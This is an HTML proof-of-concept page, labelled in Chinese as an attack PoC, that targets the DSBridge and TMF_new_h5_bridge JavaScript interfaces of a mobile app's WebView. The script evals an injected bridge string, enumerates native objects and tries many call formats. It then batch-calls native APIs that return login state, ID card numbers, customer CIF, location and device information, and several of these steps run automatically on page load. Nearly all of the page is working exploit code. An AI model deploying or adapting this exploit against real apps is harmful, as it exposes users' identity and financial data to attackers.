<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>TMF DSBridge PoC</title>
<style>
body { background: #0d1117; color: #c9d1d9; font-family: monospace; font-size: 12px; padding: 10px; }
h3 { color: #e3b341; margin: 10px 0 4px; font-size: 13px; }
pre { background: #161b22; padding: 8px; border-radius: 4px; font-size: 11px; white-space: pre-wrap; word-break: break-all; max-height: 200px; overflow: auto; }
.ok { color: #3fb950; }
.err { color: #f85149; }
.warn { color: #e3b341; }
button { background: #238636; color: #fff; border: none; padding: 5px 12px; border-radius: 4px; cursor: pointer; margin: 3px 2px; font-size: 11px; }
input { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 4px 8px; border-radius: 4px; font-size: 11px; width: 100%; margin-bottom: 4px; }
.section { border: 1px solid #21262d; border-radius: 6px; padding: 8px; margin-bottom: 10px; }
</style>
</head>
<body>
<h2 style="color:#ff6b6b">🎯 TMF DSBridge 攻击 PoC</h2>
<p style="color:#8b949e;font-size:10px">DSBridge + TMF_new_h5_bridge 双路径攻击</p>

<!-- Step1: 初始化 DSBridge -->
<div class="section">
<h3>Step 1: 初始化 TMFJSBridge（eval注入字符串）</h3>
<button onclick="initBridge()">执行初始化</button>
<pre id="o-init">等待...</pre>
</div>

<!-- Step2: 枚举 _dsbridge 方法 -->
<div class="section">
<h3>Step 2: 枚举 _dsbridge / TMF_new_h5_bridge 方法</h3>
<button onclick="inspectNative()">枚举原生对象</button>
<pre id="o-native">等待...</pre>
</div>

<!-- Step3: DSBridge 标准调用 -->
<div class="section">
<h3>Step 3: DSBridge 标准调用（自动尝试所有格式）</h3>
<button onclick="tryAllFormats()">全格式尝试</button>
<pre id="o-formats">等待...</pre>
</div>

<!-- Step4: 手动精确调用 -->
<div class="section">
<h3>Step 4: 手动调用</h3>
<input id="in-api" value="thirdGetIsLogin" placeholder="API名">
<input id="in-params" value="{}" placeholder="参数">
<input id="in-ns" value="TMFJSBridge" placeholder="命名空间（可留空）">
<button onclick="dsCall()">DSBridge 调用</button>
<button onclick="newBridgeCall()">TMF_new_h5_bridge 调用</button>
<button onclick="directDsCall()">_dsbridge.call 直接调用</button>
<pre id="o-manual">等待...</pre>
</div>

<!-- Step5: 已知敏感接口批量调用 -->
<div class="section">
<h3>Step 5: 批量调用敏感接口</h3>
<button onclick="batchCall()">批量调用</button>
<pre id="o-batch">等待...</pre>
</div>

<script>
// ─── 工具 ─────────────────────────────────────────────
var cbMap = {};
var cbIdx = 0;

function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function log(id, msg, cls) {
  var el = document.getElementById(id);
  el.innerHTML += '<span class="'+(cls||'')+'">' + esc(msg) + '\n</span>';
}

// DSBridge 的全局回调机制（_dscbst）
window._handleMessageFromNative = function(msgStr) {
  log('o-formats', '[_handleMessageFromNative] ' + msgStr, 'ok');
  try {
    var msg = JSON.parse(msgStr);
    if (msg.id && cbMap[msg.id]) {
      cbMap[msg.id](msg.data !== undefined ? msg.data : msg);
      delete cbMap[msg.id];
    }
  } catch(e) {}
};

// DMBridge 标准回调格式
window._dscbst = window._dscbst || {};

// ─── Step 1: eval 初始化 ───────────────────────────────
function initBridge() {
  var el = document.getElementById('o-init');
  el.innerHTML = '';
  
  if (typeof window.TMFJSBridge === 'string') {
    log('o-init', 'TMFJSBridge 是字符串，长度: ' + window.TMFJSBridge.length, 'warn');
    log('o-init', '前200字符: ' + window.TMFJSBridge.substring(0, 200), 'warn');
    try {
      eval(window.TMFJSBridge);
      log('o-init', 'eval() 成功执行！', 'ok');
      log('o-init', '执行后检查:', 'ok');
      log('o-init', '  window.dsBridge: ' + typeof window.dsBridge, 'ok');
      log('o-init', '  window.WebViewJavascriptBridge: ' + typeof window.WebViewJavascriptBridge, 'ok');
      log('o-init', '  window.TMFBridge: ' + typeof window.TMFBridge, 'ok');
    } catch(e) {
      log('o-init', 'eval() 失败: ' + e.message, 'err');
    }
  } else {
    log('o-init', 'TMFJSBridge 不是字符串: ' + typeof window.TMFJSBridge, 'err');
  }
}

// ─── Step 2: 枚举原生对象 ──────────────────────────────
function inspectNative() {
  var el = document.getElementById('o-native'); el.innerHTML = '';
  
  var targets = {
    '_dsbridge': window._dsbridge,
    'TMF_new_h5_bridge': window.TMF_new_h5_bridge,
    'dsBridge': window.dsBridge,
    'jsbridge': window.jsbridge,
    'android': window.android,
    'Android': window.Android,
  };
  
  Object.keys(targets).forEach(function(name) {
    var obj = targets[name];
    log('o-native', '\n=== ' + name + ' [' + typeof obj + '] ===', 'warn');
    if (!obj) { log('o-native', '  不存在', 'err'); return; }
    
    // 枚举方法
    var methods = [];
    for (var k in obj) methods.push(k + '(' + typeof obj[k] + ')');
    if (methods.length) {
      log('o-native', '  属性/方法: ' + methods.join(', '), 'ok');
    }
    try {
      var ownKeys = Object.getOwnPropertyNames(obj);
      log('o-native', '  OwnPropertyNames: ' + ownKeys.join(', '), 'ok');
    } catch(e) {}
    
    // 测试常见方法
    ['call','callHandler','invoke','has','list','hasMethod','getRegisteredHandlers'].forEach(function(m) {
      if (typeof obj[m] === 'function') {
        log('o-native', '  ✅ .' + m + '() 存在！', 'ok');
      }
    });
  });
}

// ─── Step 3: 全格式尝试 ────────────────────────────────
function tryAllFormats() {
  var el = document.getElementById('o-formats'); el.innerHTML = '';
  var api = 'thirdGetIsLogin';
  var params = '{}';
  
  function tryIt(desc, fn) {
    try {
      var r = fn();
      log('o-formats', '✅ [' + desc + '] → ' + JSON.stringify(r), 'ok');
    } catch(e) {
      log('o-formats', '❌ [' + desc + '] → ' + e.message, 'err');
    }
  }
  
  var cbId = '_poccb_' + (++cbIdx);
  window[cbId] = function(r) { log('o-formats', '[回调 ' + cbId + '] ' + JSON.stringify(r), 'ok'); };
  cbMap[cbId] = window[cbId];
  
  // ─ DSBridge Android 标准调用 ─
  // DSBridge 的协议：方法名 + 参数json + "_async_" + callbackId
  if (window._dsbridge) {
    tryIt('_dsbridge.call(api, params)', function(){
      return window._dsbridge.call(api, params);
    });
    tryIt('_dsbridge.call(api, params+async+cbId)', function(){
      return window._dsbridge.call(api, params + '_async_' + cbId);
    });
    tryIt('_dsbridge.call(ns.api, params)', function(){
      return window._dsbridge.call('TMFJSBridge.' + api, params);
    });
    tryIt('_dsbridge.call(ns.api, params+async)', function(){
      return window._dsbridge.call('TMFJSBridge.' + api, params + '_async_' + cbId);
    });
    tryIt('_dsbridge.has(api)', function(){
      return window._dsbridge.has(api);
    });
    tryIt('_dsbridge.hasNativeMethod(api, async)', function(){
      return window._dsbridge.hasNativeMethod('TMFJSBridge.' + api, 'asyn');
    });
  }
  
  // ─ TMF_new_h5_bridge ─
  if (window.TMF_new_h5_bridge) {
    tryIt('TMF_new_h5_bridge.call(api, params, cbId)', function(){
      return window.TMF_new_h5_bridge.call(api, params, cbId);
    });
    tryIt('TMF_new_h5_bridge.postMessage(json)', function(){
      return window.TMF_new_h5_bridge.postMessage(JSON.stringify({name:api, param:params, cbId:cbId}));
    });
    // 枚举 TMF_new_h5_bridge 上的所有方法
    try {
      var keys = Object.getOwnPropertyNames(window.TMF_new_h5_bridge);
      log('o-formats', 'TMF_new_h5_bridge 方法列表: ' + keys.join(', '), 'warn');
    } catch(e) {}
  }
  
  // ─ 事件触发方式 ─
  tryIt('document通过prompt(JSON)', function(){
    return window.prompt('TMFJSBridge://' + api + '?' + params);
  });
  
  log('o-formats', '\n5秒后检查回调...', 'warn');
  setTimeout(function(){
    log('o-formats', '5s 结束，查看上方是否有回调', 'warn');
  }, 5000);
}

// ─── Step 4: 手动调用 ─────────────────────────────────
function getManualParams() {
  return {
    api: document.getElementById('in-api').value.trim(),
    params: document.getElementById('in-params').value.trim(),
    ns: document.getElementById('in-ns').value.trim()
  };
}

function receiveResult(prefix, result) {
  log('o-manual', prefix + JSON.stringify(result), 'ok');
}

function dsCall() {
  var p = getManualParams(); var el = document.getElementById('o-manual'); el.innerHTML = '';
  var cbId = '_mc_' + (++cbIdx);
  window[cbId] = function(r) { receiveResult('[DSBridge回调] ', r); };
  
  if (!window._dsbridge) { log('o-manual', '_dsbridge 不存在', 'err'); return; }
  
  // 异步调用（带回调ID）
  var fullMethod = p.ns ? p.ns + '.' + p.api : p.api;
  try {
    var r = window._dsbridge.call(fullMethod, p.params + '_async_' + cbId);
    log('o-manual', '同步返回: ' + r, 'ok');
  } catch(e) { log('o-manual', '调用失败: ' + e.message, 'err'); }
  setTimeout(function(){ if(window[cbId]){ log('o-manual','超时无回调','err'); delete window[cbId];} }, 6000);
}

function newBridgeCall() {
  var p = getManualParams(); var el = document.getElementById('o-manual'); el.innerHTML = '';
  if (!window.TMF_new_h5_bridge) { log('o-manual', 'TMF_new_h5_bridge 不存在', 'err'); return; }
  var cbId = '_mc_' + (++cbIdx);
  window[cbId] = function(r) { receiveResult('[TMF_new_h5回调] ', r); };
  try {
    // 尝试各种参数格式
    var methods = Object.getOwnPropertyNames(window.TMF_new_h5_bridge);
    log('o-manual', 'TMF_new_h5_bridge 方法: ' + methods.join(', '), 'warn');
    methods.forEach(function(m) {
      if (typeof window.TMF_new_h5_bridge[m] === 'function') {
        try {
          var r = window.TMF_new_h5_bridge[m](p.api, p.params, cbId);
          log('o-manual', '.' + m + '() 返回: ' + r, 'ok');
        } catch(e) {
          log('o-manual', '.' + m + '() 异常: ' + e.message, 'err');
        }
      }
    });
  } catch(e) { log('o-manual', '错误: ' + e.message, 'err'); }
}

function directDsCall() {
  var p = getManualParams(); var el = document.getElementById('o-manual'); el.innerHTML = '';
  if (!window._dsbridge) { log('o-manual', '_dsbridge 不存在', 'err'); return; }
  var cbId = '_mc_' + (++cbIdx);
  window[cbId] = function(r) { receiveResult('[_dsbridge回调] ', r); };
  
  // 尝试 DSBridge 的同步和异步格式
  var variants = [
    [p.api, p.params],
    [p.api, p.params + '_async_' + cbId],
    ['TMFJSBridge.' + p.api, p.params],
    ['TMFJSBridge.' + p.api, p.params + '_async_' + cbId],
    [p.api, JSON.stringify({_dscbstId: cbId, args: JSON.parse(p.params || '{}')})],
  ];
  variants.forEach(function(v) {
    try {
      var r = window._dsbridge.call(v[0], v[1]);
      log('o-manual', '_dsbridge.call("' + v[0] + '", "' + v[1].substring(0,30) + '...") → ' + r, 'ok');
    } catch(e) {
      log('o-manual', '_dsbridge.call("' + v[0] + '") → 异常: ' + e.message, 'err');
    }
  });
  setTimeout(function(){ if(window[cbId]){ log('o-manual','超时无回调','err'); delete window[cbId];} }, 6000);
}

// ─── Step 5: 批量调用 ─────────────────────────────────
var SENSITIVE_APIS = [
  'thirdGetIsLogin', 'thirdGetIsAuthentication',
  'thirdGetUserPhotoNumber', 'thirdGetUserIdCardNum',
  'thirdGetUserCif', 'thirdGetMobileInfo',
  'thirdGetLocation', 'thirdGetAppVersion',
  'thirdGetRandomNumber', 'thirdGetETCCardListJsapi',
];

function batchCall() {
  var el = document.getElementById('o-batch'); el.innerHTML = '';
  if (!window._dsbridge) { log('o-batch', '_dsbridge 不存在', 'err'); return; }
  
  SENSITIVE_APIS.forEach(function(api, i) {
    setTimeout(function() {
      var cbId = '_batch_' + i;
      window[cbId] = function(r) {
        log('o-batch', '✅ [' + api + '] → ' + JSON.stringify(r).substring(0, 100), 'ok');
        delete window[cbId];
      };
      try {
        // 尝试各种命名空间 + DSBridge 异步格式
        window._dsbridge.call('TMFJSBridge.' + api, '{}' + '_async_' + cbId);
        log('o-batch', '⏳ [' + api + '] 已发送', 'warn');
      } catch(e) {
        log('o-batch', '❌ [' + api + '] ' + e.message, 'err');
        delete window[cbId];
      }
      setTimeout(function(){ if(window[cbId]){ log('o-batch','⏰ ['+api+'] 超时','err'); delete window[cbId];} }, 5000);
    }, i * 500);
  });
}

// ─── 自动执行 ─────────────────────────────────────────
window.addEventListener('load', function() {
  setTimeout(initBridge, 400);
  setTimeout(inspectNative, 800);
  setTimeout(tryAllFormats, 1400);
});
</script>
</body>
</html>
